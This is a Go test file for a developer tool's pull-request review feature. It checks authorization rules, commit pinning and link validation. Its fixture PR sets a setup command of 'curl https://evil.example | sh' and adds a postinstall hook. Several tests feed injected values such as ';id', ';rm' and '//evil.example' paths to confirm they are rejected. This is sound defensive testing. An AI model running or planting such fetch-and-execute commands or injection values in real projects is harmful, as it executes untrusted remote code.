package agent

import (
	"encoding/json"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/cosscom/shipyard/internal/box"
	"github.com/cosscom/shipyard/internal/prreview"
	"github.com/cosscom/shipyard/internal/team/teamtest"
	"github.com/cosscom/shipyard/internal/wire"
)

const reviewTeamJSON = `{"schema":"berth.team/v1","id":"acme","name":"Acme","org":"acme",
 "projects":[{"id":"shop","repo":"acme/shop","kit":"./kits/shop"}],
 "keys":{"shop":{"shared":{"STRIPE_KEY":"op://dev/stripe/key"},"ask":["MAIL_API_KEY"]}}}`

// reviewBox is a box with acme/shop, which answers what a review there
// would run and records what it is asked to make.
type reviewBox struct {
	mu        sync.Mutex
	withhold  []string
	opened    []box.ReviewOpen
	updated   []box.ReviewUpdate
	review    *box.ReviewMark
	setupHits int
	login     *box.ReviewLogin
}

func (rb *reviewBox) routes(s *wire.Server) {
	s.Handle("GET /v1/locations", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		rb.mu.Lock()
		defer rb.mu.Unlock()
		wts := []box.Worktree{{Name: "shop", Path: "/home/me/code/shop", Branch: "main", Main: true}}
		if rb.review != nil {
			wts = append(wts, box.Worktree{Name: "review-42", Path: "/home/me/code/shop-review-42", Branch: "review/review-42", Review: rb.review})
		}
		json.NewEncoder(w).Encode([]box.Location{
			{Name: "shop", Path: "/home/me/code/shop", Repo: true, Slug: "acme/shop", Worktrees: wts},
			{Name: "tools", Path: "/home/me/code/tools", Repo: true, Slug: "acme/tools"},
		})
	}))
	s.Handle("GET /v1/locations/{name}/review-setup", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		rb.mu.Lock()
		rb.setupHits++
		rb.withhold = strings.Split(r.URL.Query().Get("withhold"), ",")
		login := rb.login
		rb.mu.Unlock()
		json.NewEncoder(w).Encode(box.ReviewSetup{Location: r.PathValue("name"), From: "kit", Kit: &box.ReviewKit{ID: "acme-shop", Name: "Acme shop"}, RepoConfig: "none",
			Script: "yarn install && yarn db:create", Services: []box.ReviewService{{Name: "web", Title: "Next.js", Run: "yarn dev", Autostart: true}},
			Watch: []string{"config/*.yml"}, Secrets: box.ReviewSecrets{Shared: []string{"STRIPE_KEY"}, Withheld: []string{"MAIL_API_KEY"}}, IdleDays: 7, Existing: []box.ReviewEntry{}, Login: login})
	}))
	s.Handle("POST /v1/reviews", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req box.ReviewOpen
		json.NewDecoder(r.Body).Decode(&req)
		rb.mu.Lock()
		rb.opened = append(rb.opened, req)
		mark := &box.ReviewMark{Repo: req.Repo, PR: req.PR, SHA: req.SHA, Title: req.Title, Opened: time.Now()}
		rb.review = mark
		rb.mu.Unlock()
		json.NewEncoder(w).Encode(box.Worktree{Name: "review-42", Path: "/home/me/code/shop-review-42", Branch: "review/review-42", Title: "Review: #42 " + req.Title, Review: mark})
	}))
	s.Handle("POST /v1/reviews/update", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req box.ReviewUpdate
		json.NewDecoder(r.Body).Decode(&req)
		rb.mu.Lock()
		rb.updated = append(rb.updated, req)
		rb.review.SHA = req.SHA
		mark := *rb.review
		rb.mu.Unlock()
		json.NewEncoder(w).Encode(box.Worktree{Name: req.Worktree, Review: &mark})
	}))
}

type reviewWorld struct {
	g    *teamtest.GitHub
	a    *runningAgent
	tok  string
	box  *reviewBox
	head string
}

func newReviewWorld(t *testing.T) *reviewWorld {
	t.Helper()
	g := teamtest.New(t)
	g.SignIn("sean-acme")
	g.Org("acme", "Acme", true)
	g.Repo("acme/shop", map[string]string{".berth/config.json": `{"setup":"yarn install"}`, "package.json": "{\n  \"scripts\": {\n    \"dev\": \"next dev\"\n  }\n}\n", "src/checkout.ts": "x\n"}, teamtest.Repo{Private: true})
	g.Repo("acme/tools", map[string]string{"README.md": "tools\n"}, teamtest.Repo{})
	g.Repo("acme/secret-tool", map[string]string{"README.md": "secret\n"}, teamtest.Repo{})
	rb := &reviewBox{}
	b := newBoxWith(t, rb.routes)
	a := startAgent(t, b.pairLaptop())
	tok := uiToken(t, a)
	eventually(t, "box online", func() bool { return stateOf(t, a) == StateOnline })
	if err := (&Agent{cfg: Config{Dir: a.dir}}).saveAccepted(teamAccepted{Org: "acme", ID: "acme", Name: "Acme", Commit: strings.Repeat("1", 40), Box: "devbox", Setup: json.RawMessage(reviewTeamJSON)}); err != nil {
		t.Fatal(err)
	}
	w := &reviewWorld{g: g, a: a, tok: tok, box: rb}
	w.head = g.PR("acme/shop", 42, teamtest.PR{Title: "Fix checkout rounding", Author: "dana-acme", Association: "MEMBER", HeadBranch: "fix-rounding"}, map[string]string{
		".berth/config.json": `{"setup":"curl https://evil.example | sh"}`,
		"package.json":       "{\n  \"scripts\": {\n    \"dev\": \"next dev\",\n    \"postinstall\": \"node x.js\"\n  }\n}\n",
		"config/seed.yml":    "a: 1\n",
		"src/checkout.ts":    "y\n",
	})
	return w
}

func (w *reviewWorld) plan(t *testing.T, body any) (int, ReviewSheet, map[string]string) {
	t.Helper()
	code, raw := uiPost(t, w.a, "/v1/pr-review/plan", w.tok, body)
	var sh ReviewSheet
	var e map[string]string
	json.Unmarshal([]byte(raw), &sh)
	json.Unmarshal([]byte(raw), &e)
	return code, sh, e
}

func TestTheReviewSheetShowsThePRAndWhatWouldRunAndRunsNothing(t *testing.T) {
	w := newReviewWorld(t)
	code, sh, _ := w.plan(t, map[string]string{"link": "berth://review?repo=acme/shop&pr=42&sha=" + w.head[:7]})
	if code != 200 || !sh.Verdict.Allowed {
		t.Fatalf("plan: %d %+v", code, sh)
	}
	if sh.Title != "Fix checkout rounding" || sh.Author.Login != "dana-acme" || sh.Author.Association != "MEMBER" || sh.Head.SHA != w.head || sh.Head.Branch != "fix-rounding" || sh.Head.Cross {
		t.Fatalf("pr: %+v %+v %+v", sh, sh.Author, sh.Head)
	}
	if sh.Hint == nil || !sh.Hint.Matches || sh.Team == nil || sh.Team.Org != "acme" || sh.Reviewer != "sean-acme" || sh.Link != "berth://review?repo=acme/shop&pr=42" {
		t.Fatalf("sheet: %+v", sh)
	}
	if len(sh.Boxes) != 1 || sh.Box != "devbox" || sh.Boxes[0].Location != "shop" || sh.Boxes[0].Setup.Kit.Name != "Acme shop" || len(sh.Boxes[0].Setup.Services) != 1 ||
		strings.Join(sh.Boxes[0].Secrets.Withheld, ",") != "MAIL_API_KEY" {
		t.Fatalf("boxes: %+v", sh.Boxes)
	}
	// The box was told which keys are the reviewer's own, by name.
	if strings.Join(w.box.withhold, ",") != "MAIL_API_KEY" {
		t.Fatalf("withhold sent: %v", w.box.withhold)
	}
	kinds := []string{}
	for _, c := range sh.Changes {
		kinds = append(kinds, c.Kind)
	}
	if strings.Join(kinds, ",") != "berth,scripts,kit" || sh.Files != 4 {
		t.Fatalf("changes: %v (%d files)", kinds, sh.Files)
	}
	// Nothing was made, and nothing on GitHub was changed or fetched into a
	// box: gh read the PR and its diff.
	if len(w.box.opened) != 0 {
		t.Fatalf("the sheet made a worktree: %+v", w.box.opened)
	}
	for _, c := range w.g.Calls() {
		if strings.HasPrefix(c, "pr ") && !strings.HasPrefix(c, "pr view 42 -R acme/shop") && !strings.HasPrefix(c, "pr diff 42 -R acme/shop") {
			t.Fatalf("gh was asked: %s", c)
		}
	}
	// A hint that is not the head only warns.
	_, sh, _ = w.plan(t, map[string]string{"link": "berth://review?repo=acme/shop&pr=42&sha=0000000"})
	if !sh.Verdict.Allowed || sh.Hint == nil || sh.Hint.Matches || sh.Head.SHA != w.head {
		t.Fatalf("hint: %+v", sh)
	}
}

func TestReviewAuthorizationLetsMembersInAndRefusesTheRest(t *testing.T) {
	w := newReviewWorld(t)
	pr := func(n int, p teamtest.PR) { w.g.PR("acme/shop", n, p, map[string]string{"x.txt": "x\n"}) }
	pr(43, teamtest.PR{Title: "Owner's", Author: "boss", Association: "OWNER"})
	pr(44, teamtest.PR{Title: "Collaborator's", Author: "contractor", Association: "COLLABORATOR"})
	pr(61, teamtest.PR{Title: "From a fork", Author: "jo", Association: "MEMBER", Cross: true, HeadRepo: "jo/shop"})
	pr(62, teamtest.PR{Title: "Contributor's", Author: "stranger", Association: "CONTRIBUTOR"})
	pr(63, teamtest.PR{Title: "Nobody's", Author: "stranger", Association: "NONE"})
	pr(64, teamtest.PR{Title: "Merged", Author: "dana-acme", Association: "MEMBER", State: "MERGED"})
	w.g.PR("acme/secret-tool", 1, teamtest.PR{Title: "Not ours", Author: "dana-acme", Association: "MEMBER"}, map[string]string{"x": "x\n"})
	for _, n := range []int{42, 43, 44} {
		if _, sh, _ := w.plan(t, map[string]any{"repo": "acme/shop", "pr": n}); !sh.Verdict.Allowed {
			t.Errorf("#%d: %+v", n, sh.Verdict)
		}
	}
	for _, c := range []struct {
		repo   string
		pr     int
		code   string
		reason string
	}{
		{"acme/shop", 61, prreview.CodeFork, "Review this one by hand: it comes from a fork (jo/shop)"},
		{"acme/shop", 62, prreview.CodeOutsider, "Review this one by hand: its author is outside acme"},
		{"acme/shop", 63, prreview.CodeOutsider, "Review this one by hand: its author is outside acme"},
		{"acme/shop", 64, prreview.CodeClosed, "This PR is merged, so there is nothing left to review"},
		{"acme/shop", 99, prreview.CodeUnreadable, "You can't see acme/shop#99 with your GitHub account, or it doesn't exist"},
		{"acme/secret-tool", 1, prreview.CodeNotAProject, "acme/secret-tool isn't one of your team's projects or on any of your boxes"},
	} {
		code, sh, _ := w.plan(t, map[string]any{"repo": c.repo, "pr": c.pr})
		if code != 200 || sh.Verdict.Allowed || sh.Verdict.Code != c.code || !strings.HasPrefix(sh.Verdict.Reason, c.reason) {
			t.Errorf("%s#%d: %d %+v; want %s %q", c.repo, c.pr, code, sh.Verdict, c.code, c.reason)
		}
	}
	// A repository nobody listed is refused before GitHub is asked.
	for _, call := range w.g.Calls() {
		if strings.Contains(call, "secret-tool") {
			t.Fatalf("gh was asked about a repository outside the team: %s", call)
		}
	}
	// acme/tools isn't in team.json, but it is on the box: allowed.
	w.g.PR("acme/tools", 5, teamtest.PR{Title: "Tools", Author: "dana-acme", Association: "MEMBER"}, map[string]string{"y": "y\n"})
	if _, sh, _ := w.plan(t, map[string]any{"repo": "acme/tools", "pr": 5}); !sh.Verdict.Allowed {
		t.Errorf("a project on the box: %+v", sh.Verdict)
	}
	// Junk is not a link.
	for _, link := range []string{"berth://review?repo=acme/shop;id&pr=42", "berth://review?repo=acme/shop&pr=42&setup=make", "acme/shop#0", "https://evil.example/?repo=acme/shop&pr=42"} {
		if code, _, e := w.plan(t, map[string]string{"link": link}); code != 400 || e["code"] != "bad_link" {
			t.Errorf("%q: %d %v", link, code, e)
		}
	}
}

func TestReviewOpensOnlyTheCommitTheReviewerWasShown(t *testing.T) {
	w := newReviewWorld(t)
	w.g.PR("acme/shop", 61, teamtest.PR{Title: "From a fork", Author: "jo", Association: "MEMBER", Cross: true, HeadRepo: "jo/shop"}, map[string]string{"x": "x\n"})
	// Opening a refused PR directly, without the sheet, is refused too.
	fork := w.g.PR("acme/shop", 61, teamtest.PR{Title: "From a fork", Author: "jo", Association: "MEMBER", Cross: true, HeadRepo: "jo/shop"}, map[string]string{"x": "xx\n"})
	code, body := uiPost(t, w.a, "/v1/pr-review/open", w.tok, ReviewOpenRequest{Repo: "acme/shop", PR: 61, SHA: fork, Box: "devbox"})
	if code != http.StatusForbidden || !strings.Contains(body, `"code":"fork"`) {
		t.Fatalf("fork: %d %s", code, body)
	}
	// A commit that isn't the head is refused.
	code, body = uiPost(t, w.a, "/v1/pr-review/open", w.tok, ReviewOpenRequest{Repo: "acme/shop", PR: 42, SHA: strings.Repeat("a", 40), Box: "devbox"})
	if code != http.StatusConflict || !strings.Contains(body, `"code":"moved"`) {
		t.Fatalf("wrong commit: %d %s", code, body)
	}
	if len(w.box.opened) != 0 {
		t.Fatalf("the box was asked: %+v", w.box.opened)
	}
	code, body = uiPost(t, w.a, "/v1/pr-review/open", w.tok, ReviewOpenRequest{Repo: "acme/shop", PR: 42, SHA: w.head, Box: "devbox"})
	if code != 200 {
		t.Fatalf("open: %d %s", code, body)
	}
	if len(w.box.opened) != 1 {
		t.Fatalf("opened %+v", w.box.opened)
	}
	got := w.box.opened[0]
	if got.Location != "shop" || got.Repo != "acme/shop" || got.PR != 42 || got.SHA != w.head || got.Author != "dana-acme" || got.Association != "MEMBER" ||
		got.Reviewer != "sean-acme" || strings.Join(got.Withhold, ",") != "MAIL_API_KEY" || got.Title != "Fix checkout rounding" {
		t.Fatalf("sent %+v", got)
	}
	var opened ReviewOpened
	json.Unmarshal([]byte(body), &opened)
	if opened.Box != "devbox" || opened.Review == nil || opened.Review.SHA != w.head {
		t.Fatalf("opened %+v", opened)
	}

	// The PR moves on: the review says so, and Update to latest confirms
	// the new head, checked again.
	newer := w.g.PR("acme/shop", 42, teamtest.PR{Title: "Fix checkout rounding", Author: "dana-acme", Association: "MEMBER", HeadBranch: "fix-rounding"}, map[string]string{"src/more.ts": "z\n"})
	resp, raw := uiCall(t, w.a, http.MethodGet, "/v1/pr-review/status?box=devbox&location=shop&worktree=review-42", w.tok)
	var st ReviewStatus
	json.Unmarshal([]byte(raw), &st)
	if resp.StatusCode != 200 || st.NewCommits != 1 || !st.Moved || st.Head != newer || st.State != "OPEN" {
		t.Fatalf("status: %d %s", resp.StatusCode, raw)
	}
	// The old commit is no longer what Review opens.
	if code, body := uiPost(t, w.a, "/v1/pr-review/update", w.tok, ReviewUpdateRequest{Box: "devbox", Location: "shop", Worktree: "review-42", SHA: w.head}); code != http.StatusConflict {
		t.Fatalf("update to the old head: %d %s", code, body)
	}
	if code, body := uiPost(t, w.a, "/v1/pr-review/update", w.tok, ReviewUpdateRequest{Box: "devbox", Location: "shop", Worktree: "review-42", SHA: newer}); code != 200 {
		t.Fatalf("update: %d %s", code, body)
	}
	if len(w.box.updated) != 1 || w.box.updated[0].SHA != newer || strings.Join(w.box.updated[0].Withhold, ",") != "MAIL_API_KEY" {
		t.Fatalf("updated %+v", w.box.updated)
	}
	// The author is outside the org now: Update is refused like Open.
	newest := w.g.PR("acme/shop", 42, teamtest.PR{Title: "Fix checkout rounding", Author: "dana-acme", Association: "NONE"}, map[string]string{"src/x.ts": "q\n"})
	if code, body := uiPost(t, w.a, "/v1/pr-review/update", w.tok, ReviewUpdateRequest{Box: "devbox", Location: "shop", Worktree: "review-42", SHA: newest}); code != http.StatusForbidden || !strings.Contains(body, "outside acme") {
		t.Fatalf("update by an outsider: %d %s", code, body)
	}
}

func TestReviewWorksWithAnOlderGHAndATooLargeDiff(t *testing.T) {
	w := newReviewWorld(t)
	t.Setenv("GH_FAKE_NO_ASSOCIATION", "1")
	t.Setenv("GH_FAKE_DIFF_TOO_LARGE", "1")
	_, sh, _ := w.plan(t, map[string]any{"repo": "acme/shop", "pr": 42})
	if !sh.Verdict.Allowed || sh.Author.Association != "MEMBER" || sh.Head.SHA != w.head {
		t.Fatalf("sheet: %+v", sh)
	}
	var scripts *prreview.Change
	for i := range sh.Changes {
		if sh.Changes[i].Kind == prreview.KindScripts {
			scripts = &sh.Changes[i]
		}
	}
	if scripts == nil || !strings.Contains(scripts.Detail, "couldn't read") {
		t.Fatalf("changes without a diff: %+v", sh.Changes)
	}
	calls := strings.Join(w.g.Calls(), "\n")
	if !strings.Contains(calls, "api repos/acme/shop/pulls/42") {
		t.Fatalf("no REST fallback:\n%s", calls)
	}
}

func TestReviewRoutesNeedGitHub(t *testing.T) {
	w := newReviewWorld(t)
	w.g.SignIn("")
	code, raw := uiPost(t, w.a, "/v1/pr-review/plan", w.tok, map[string]any{"repo": "acme/shop", "pr": 42})
	if code != http.StatusPreconditionFailed || !strings.Contains(raw, "gh_signed_out") {
		t.Fatalf("%d %s", code, raw)
	}
}

func TestAReviewLinkCanOpenLoggedInAtAPageWhenTheProjectAllows(t *testing.T) {
	w := newReviewWorld(t)
	link := "berth://review?repo=acme/shop&pr=42&as=pro@acme.test&path=/event-types"
	login := func(sh ReviewSheet) *ReviewBoxLogin {
		if len(sh.Boxes) != 1 {
			t.Fatalf("boxes: %+v", sh.Boxes)
		}
		return sh.Boxes[0].Login
	}
	// No login on the box: it opens anyway, without logging in.
	_, sh, _ := w.plan(t, map[string]string{"link": link})
	if !sh.Verdict.Allowed || sh.Login == nil || sh.Login.As != "pro@acme.test" || sh.Login.Path != "/event-types" || sh.Link != link {
		t.Fatalf("sheet: %+v %+v", sh.Verdict, sh.Login)
	}
	if l := login(sh); l == nil || l.Allowed || l.Reason != "acme/shop has no login set up on this box, so it opens without logging in" {
		t.Fatalf("no login config: %+v", l)
	}
	// A user the project doesn't list.
	w.box.mu.Lock()
	w.box.login = &box.ReviewLogin{Users: []string{"admin@acme.test"}}
	w.box.mu.Unlock()
	_, sh, _ = w.plan(t, map[string]string{"link": link})
	if l := login(sh); l == nil || l.Allowed || l.Reason != "pro@acme.test isn't one of acme/shop's login users, so it opens without logging in" || !sh.Verdict.Allowed {
		t.Fatalf("not listed: %+v %+v", l, sh.Verdict)
	}
	// Open still makes the review, and opens the page without a login.
	code, body := uiPost(t, w.a, "/v1/pr-review/open", w.tok, ReviewOpenRequest{Repo: "acme/shop", PR: 42, SHA: w.head, Box: "devbox", As: "pro@acme.test", Path: "/event-types"})
	var opened ReviewOpened
	json.Unmarshal([]byte(body), &opened)
	if code != 200 || !regexp.MustCompile(`^http://review-42\.shop\.devbox\.localhost:\d+/event-types$`).MatchString(opened.Open) || strings.Contains(opened.Open, "__berth") {
		t.Fatalf("open, not allowed: %d %s", code, body)
	}
	// A listed user: through the login route.
	w.box.mu.Lock()
	w.box.login = &box.ReviewLogin{Users: []string{"pro@acme.test"}}
	w.box.mu.Unlock()
	_, sh, _ = w.plan(t, map[string]any{"repo": "acme/shop", "pr": 42, "as": "pro@acme.test", "path": "/event-types"})
	if l := login(sh); l == nil || !l.Allowed {
		t.Fatalf("listed: %+v", l)
	}
	code, body = uiPost(t, w.a, "/v1/pr-review/open", w.tok, ReviewOpenRequest{Repo: "acme/shop", PR: 42, SHA: w.head, Box: "devbox", As: "pro@acme.test", Path: "/event-types"})
	json.Unmarshal([]byte(body), &opened)
	if code != 200 || !regexp.MustCompile(`^http://review-42\.shop\.devbox\.localhost:\d+/__berth/login\?as=pro%40acme\.test&next=%2Fevent-types$`).MatchString(opened.Open) {
		t.Fatalf("open, allowed: %d %s", code, opened.Open)
	}
	// The box was asked for nothing more: as and path never reach it.
	for _, o := range w.box.opened {
		if strings.Contains(string(mustJSONAgent(o)), "event-types") || strings.Contains(string(mustJSONAgent(o)), "pro@acme.test") {
			t.Fatalf("sent to the box: %+v", o)
		}
	}
	// Junk in either refuses the whole link.
	for _, bad := range []map[string]any{
		{"link": "berth://review?repo=acme/shop&pr=42&as=a@b.c;rm"},
		{"link": "berth://review?repo=acme/shop&pr=42&path=//evil.example"},
		{"repo": "acme/shop", "pr": 42, "path": "https://evil.example"},
		{"repo": "acme/shop", "pr": 42, "as": "pro@acme.test\nx"},
	} {
		if code, _, e := w.plan(t, bad); code != 400 || e["code"] != "bad_link" {
			t.Errorf("%v: %d %v", bad, code, e)
		}
	}
	if code, _ := uiPost(t, w.a, "/v1/pr-review/open", w.tok, ReviewOpenRequest{Repo: "acme/shop", PR: 42, SHA: w.head, Box: "devbox", Path: "//evil.example"}); code != 400 {
		t.Fatalf("open with a bad path: %d", code)
	}
}

func mustJSONAgent(v any) []byte {
	b, _ := json.Marshal(v)
	return b
}
